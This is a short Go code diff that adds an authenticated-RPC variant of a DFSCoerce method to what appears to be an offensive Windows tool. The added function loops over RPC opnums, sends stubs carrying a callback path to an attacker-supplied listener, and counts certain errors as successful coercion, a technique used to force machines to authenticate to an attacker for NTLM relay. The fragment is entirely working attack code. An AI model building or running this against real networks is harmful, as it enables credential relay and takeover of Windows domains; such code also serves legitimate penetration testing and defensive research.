@@ -63,6 +63,29 @@ func (d *DFSCoerce) Coerce(ctx context.Context, rpc *dcerpc.Client, listener str
 	return lastErr
 }
 
+// CoerceAuth uses authenticated RPC (PKT_PRIVACY) for coercion
+func (d *DFSCoerce) CoerceAuth(ctx context.Context, rpc *AuthenticatedClient, listener string, opts CoerceOptions) error {
+	opnums := d.getOpnums(opts)
+	path := buildCallbackPath(listener, opts.UseHTTP, opts.HTTPPort)
+
+	var lastErr error
+	for _, opnum := range opnums {
+		stub := d.createStub(path, opnum.Opnum)
+		_, err := rpc.Call(opnum.Opnum, stub)
+
+		if err != nil {
+			if isCoercionSuccess(err) {
+				return nil
+			}
+			lastErr = err
+			continue
+		}
+		return nil
+	}
+
+	return lastErr
+}
+
 func (d *DFSCoerce) getOpnums(opts CoerceOptions) []OpnumInfo {
 	if opts.SpecificOpnum >= 0 {
 		for _, op := range d.Opnums() {
